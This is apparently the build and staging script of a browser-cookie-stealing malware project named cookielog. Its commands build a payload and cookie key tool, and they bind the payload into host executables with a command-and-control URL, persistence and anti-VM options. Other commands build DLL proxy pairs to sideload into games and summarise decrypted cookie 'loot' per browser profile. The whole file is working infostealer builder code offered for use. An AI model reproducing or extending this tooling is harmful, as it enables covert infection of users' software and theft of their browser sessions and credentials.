#!/usr/bin/env python3
"""build.py -- one entrypoint for build, verify and staging.

    python build.py check                  # toolchain, deps, artifacts, slots
    python build.py all                    # payload + keytool + verify
    python build.py payload                # build.bat (falls back to clang)
    python build.py keytool                # build_keytool.bat
    python build.py verify                 # artifacts and loader slots
    python build.py stage HOST --c2 URL    # patch loader, append host
    python build.py proxy DLL --c2 URL     # stage a native x64 DLL proxy pair
    python build.py test                   # unit tests (stdlib unittest)
    python build.py hash                   # sha256 of bin/

The old .bat files stay callable; they are the toolchain layer. This script is
the single command the rest of the repo (and install.ps1) talks to.
"""
import argparse
import importlib.util
import os
import shutil
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from cklog import build as B            # noqa: E402
from cklog import coverage as C         # noqa: E402
from cklog import dllproxy              # noqa: E402
from cklog import pe                    # noqa: E402


def _ok(flag):
    return "ok" if flag else "MISSING"


def cmd_check(args):
    print("host:     %s %s" % (sys.platform, sys.version.split()[0]))
    print("root:     %s" % HERE)

    deps = []
    for mod in ("cryptography",):
        deps.append((mod, importlib.util.find_spec(mod) is not None))
    print("python deps: " + ", ".join("%s=%s" % (m, _ok(v)) for m, v in deps))

    if sys.platform == "win32":
        ok, info = B.toolchain_status(HERE)
        print("toolchain: %s%s" % (_ok(ok), (" (%s)" % info) if info else ""))
    else:
        print("toolchain: n/a on this host (bin/ is prebuilt)")

    print("\nartifacts:")
    bad = 0
    for r in B.artifacts(HERE):
        if not r["exists"]:
            print("  %-12s %-22s MISSING%s" % (r["key"], r["rel"],
                                               "" if r["required"] else " (optional)"))
            if r["required"]:
                bad += 1
            continue
        print("  %-12s %-22s %8d  %s  %s" % (r["key"], r["rel"], r["size"],
                                            "PE" if r["pe"] else "not PE",
                                            r["sha256"][:16]))
        if r["required"] and not r["pe"]:
            bad += 1

    slots = B.sentinels(HERE)
    if slots:
        print("\nloader slots:")
        for s in slots:
            print("  %-8s %-8s %s" % (s["name"], s["state"],
                                      ("@%d %s" % (s["offset"], s["section"])) if s["offset"] >= 0 else ""))
    print("\n%s" % ("ready" if bad == 0 else "%d required artifact(s) missing" % bad))

    # Hash verification for tracked prebuilt binaries.
    hash_ok, hash_bad = B.verify_hashes(HERE)
    if hash_bad:
        print("\nhash mismatches:")
        for rel, expected, actual in hash_bad:
            print("  %-24s expected %s  got %s" % (rel, expected[:16], actual[:16]))
    else:
        print("hashes:   all tracked binaries match")

    return 0 if (bad == 0 and hash_ok) else 1


def cmd_verify(args):
    rows = B.artifacts(HERE)
    bad = [r for r in rows if r["required"] and not (r["exists"] and r["pe"])]
    for r in rows:
        print("%-12s %-22s %s" % (r["key"], r["rel"], _ok(r["exists"] and r["pe"])))
    for s in B.sentinels(HERE):
        print("slot %-8s %s" % (s["name"], s["state"]))
    return 0 if not bad else 1


def cmd_all(args):
    if sys.platform != "win32":
        print("build scripts are Windows-only; nothing to do on this host")
        return 1
    ok, info = B.toolchain_status(HERE)
    if not ok:
        print("no usable toolchain: %s" % info)
        return 1
    print("toolchain: %s" % info)
    print("\n[payload]")
    ok, out = B.build_payload(HERE)
    print(out)
    if not ok:
        return 1
    print("\n[keytool]")
    ok, out = B.build_keytool(HERE)
    print(out)
    if not ok:
        return 1
    print("\n[verify]")
    return cmd_verify(args)


def cmd_payload(args):
    ok, out = B.build_payload(HERE)
    print(out)
    return 0 if ok else 1


def cmd_keytool(args):
    ok, out = B.build_keytool(HERE)
    print(out)
    return 0 if ok else 1


def cmd_hash(args):
    for r in B.artifacts(HERE):
        if r["exists"]:
            print("%s  %8d  %s" % (r["sha256"], r["size"], r["rel"]))
    return 0


def _verify_staged(blob, c2):
    """Cheap structural checks on [loader][host][len][CKLG]."""
    problems = []
    if blob[:2] != b"MZ":
        problems.append("no MZ header")
    if not blob.endswith(b"CKLG"):
        problems.append("no CKLG tail")
    else:
        hlen = struct.unpack_from("<I", blob, len(blob) - 8)[0]
        if hlen <= 0 or hlen + 8 > len(blob) - 2:
            problems.append("host length out of range")
    if c2 and c2.encode("utf-8") not in blob:
        problems.append("C2 URL absent from loader")
    if len(blob) < 200 * 1024:
        problems.append("suspiciously small package")
    return problems


def cmd_stage(args):
    import auto

    if not os.path.isfile(args.host):
        print("host not found: %s" % args.host)
        return 1
    if len(args.c2.encode("utf-8")) > 255:
        print("C2 URL longer than the 255-byte payload limit")
        return 1
    try:
        blob = auto.build_infected_bytes(args.host, args.c2,
                                         persist=args.persist,
                                         no_anti_vm=args.no_anti_vm)
    except (OSError, ValueError) as ex:
        print("staging failed: %s" % ex)
        return 1
    out = args.output or os.path.join(HERE, "ifec", "apps", os.path.basename(args.host))
    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
    with open(out, "wb") as f:
        f.write(blob)

    problems = _verify_staged(blob, args.c2)
    print("staged:   %s" % out)
    print("size:     %d bytes" % len(blob))
    print("sha256:   %s" % pe.sha256(blob))
    print("c2:       %s" % args.c2)
    print("persist:  %s" % ("on" if args.persist else "off"))
    print("anti-vm:  %s" % ("off" if args.no_anti_vm else "on"))
    for p in problems:
        print("problem:  %s" % p)
    return 0 if not problems else 1


def _same_path(a, b):
    return os.path.normcase(os.path.abspath(a)) == os.path.normcase(os.path.abspath(b))


def _verify_proxy_exports(original, proxy):
    """Every original name and ordinal must survive the proxy link."""
    proxy_rows = {row.ordinal: row for row in dllproxy.parse_exports(proxy)}
    for row in dllproxy.parse_exports(original):
        forwarded = proxy_rows.get(row.ordinal)
        if forwarded is None or not set(row.names).issubset(forwarded.names):
            return "export ordinal %d or one of its names is missing" % row.ordinal
        expected = ".#%d" % row.ordinal
        if not forwarded.forwarder or not forwarded.forwarder.endswith(expected):
            return "export ordinal %d is not forwarded" % row.ordinal
    return None


def cmd_proxy(args):
    """Build into a staging directory; never replace the installed source DLL."""
    if sys.platform != "win32":
        print("DLL proxy builds are Windows-only")
        return 1
    source = os.path.abspath(args.dll)
    if not os.path.isfile(source):
        print("DLL not found: %s" % source)
        return 1
    if not os.path.isfile(os.path.join(HERE, "bin", "chkstk.obj")):
        print("base payload missing; run: python build.py payload")
        return 1
    try:
        with open(source, "rb") as f:
            original = f.read()
        rows = dllproxy.parse_exports(original)
        if not rows:
            raise dllproxy.PEError("DLL has no exports to proxy")
        def_text = dllproxy.generate_def(original, source)
    except (OSError, dllproxy.PEError) as ex:
        print("invalid proxy target: %s" % ex)
        return 1

    stem = os.path.splitext(os.path.basename(source))[0]
    out_dir = os.path.abspath(args.output_dir or os.path.join(HERE, "ifec", "dll", stem))
    proxy_path = os.path.join(out_dir, os.path.basename(source))
    if _same_path(source, proxy_path):
        print("output directory must differ from the installed DLL directory")
        return 1
    sibling_path = os.path.join(out_dir, dllproxy.sibling_dll_name(source))

    temp_root = os.path.join(os.environ.get("LOCALAPPDATA", tempfile.gettempdir()),
                             "Temp", "opencode")
    os.makedirs(temp_root, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="ck_proxy_", dir=temp_root) as work:
        def_path = os.path.join(work, "exports.def")
        temp_dll = os.path.join(work, os.path.basename(source))
        with open(def_path, "w", encoding="ascii", newline="") as f:
            f.write(def_text)
        ok, out = B.build_proxy(HERE, def_path, temp_dll,
                                os.path.join(work, "proxy.lib"),
                                os.path.join(work, "proxy.pdb"))
        if out:
            print(out)
        if not ok:
            return 1
        try:
            dllproxy.patch_proxy_c2(temp_dll, args.c2)
            with open(temp_dll, "rb") as f:
                proxy = f.read()
            problem = _verify_proxy_exports(original, proxy)
            if problem:
                raise dllproxy.PEError(problem)
        except (OSError, dllproxy.PEError) as ex:
            print("proxy verification failed: %s" % ex)
            return 1

        os.makedirs(out_dir, exist_ok=True)
        shutil.copy2(source, sibling_path)
        shutil.copy2(temp_dll, proxy_path)
        shutil.copy2(def_path, os.path.join(out_dir, "proxy_exports.def"))

    print("proxy:    %s" % proxy_path)
    print("original: %s" % sibling_path)
    print("exports:  %d forwarded" % len(rows))
    print("size:     %d bytes" % len(proxy))
    print("sha256:   %s" % pe.sha256(proxy))
    print("c2:       %s" % args.c2)
    print("install:  back up the game DLL, then place both staged DLLs beside the game exe")
    return 0


def cmd_test(args):
    import unittest
    loader = unittest.TestLoader()
    suite = loader.discover(os.path.join(HERE, "tests"), pattern="test_*.py",
                            top_level_dir=HERE)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    return 0 if result.wasSuccessful() else 1


def cmd_coverage(args):
    rows = C.load_all(os.path.join(HERE, "loot"))
    if not rows:
        print("no coverage manifests in loot/coverage.jsonl")
        return 0
    for m in rows:
        print(C.summarize(m))
        for s in m.get("sources", []):
            label = s.get("browser") or s.get("kind") or "?"
            detail = s.get("skipped") or ("%d/%d" % (s.get("decrypted", 0), s.get("rows", 0)))
            print("  %-10s %-14s %s" % (label, (s.get("profile") or "-")[:14], detail))
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="cookielog build and staging")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("check", help="toolchain, deps, artifacts, slots")
    sub.add_parser("verify", help="artifacts and loader slots")
    sub.add_parser("all", help="payload + keytool + verify")
    sub.add_parser("payload", help="build payload with build.bat")
    sub.add_parser("keytool", help="build ckkey.exe")
    sub.add_parser("hash", help="sha256 of bin/")
    sub.add_parser("test", help="unit tests")
    sub.add_parser("coverage", help="read loot/coverage.jsonl")

    st = sub.add_parser("stage", help="patch loader and append host")
    st.add_argument("host")
    st.add_argument("--c2", required=True)
    st.add_argument("--persist", action="store_true")
    st.add_argument("--no-anti-vm", action="store_true")
    st.add_argument("-o", "--output")

    proxy = sub.add_parser("proxy", help="stage an x64 native DLL proxy pair")
    proxy.add_argument("dll")
    proxy.add_argument("--c2", required=True)
    proxy.add_argument("-o", "--output-dir")

    args = ap.parse_args(argv)
    fn = {"check": cmd_check, "verify": cmd_verify, "all": cmd_all,
          "payload": cmd_payload, "keytool": cmd_keytool, "hash": cmd_hash,
          "test": cmd_test, "stage": cmd_stage, "proxy": cmd_proxy,
          "coverage": cmd_coverage}[args.cmd]
    return fn(args)


if __name__ == "__main__":
    sys.exit(main())
